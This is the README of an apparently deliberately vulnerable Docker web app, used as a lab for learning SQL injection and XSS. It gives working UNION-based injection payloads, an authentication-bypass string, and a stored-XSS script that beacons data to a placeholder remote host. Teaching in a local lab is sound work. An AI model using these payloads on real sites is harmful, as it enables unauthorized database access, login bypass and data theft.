# Vulnerable-Web-App
Web app that is vulnerable to SQL-Injection and XSS attacks. Forked from https://github.com/steven-karschnia/Vulnerable-Web-App

Add text data to template.php

---

### To start 
Install docker and docker-compose 

`cd public`

Run `docker-compose start`

Run `docker-compose up`

Navigate to <http://localhost:8080>

---

### To add tables or records in MySQL
Edit `public/sql/dump.sql`

Run `docker-compose stop`

Run `docker-compose rm`

Start app again

---

### SQL Inject Tutorial
Navigate to <http://localhost:8080/catalog.php>

Enter `Hammer` to see how table shows up

Enter `Hammer' UNION SELECT table_schema, table_name, 1, 1 FROM information_schema.tables;#` to view all tables

*All tables with table_schema ceh are in current database*

Enter `Hammer' UNION SELECT * FROM users;#` to view information from users table

Click on [Login](http://localhost:8080/login.php)

Enter into either the username or password field `'OR'1'='1';#` to login to the webpage without verification

---

### XSS Tutorial
Navigate to <http://localhost:8080/comment.php>

The name and message inputs of the form with output to the page, every time it is loaded, once button is pressed

Enter into either the name or message box `<script>alert("hacked");</script>` to test for XSS Vulnerability
`<script>new Image().src="http://remote_ip:remote_port/whatever?output="</script>`

*Insert any script the either of the two boxes and the script will be run everytime the page loads*
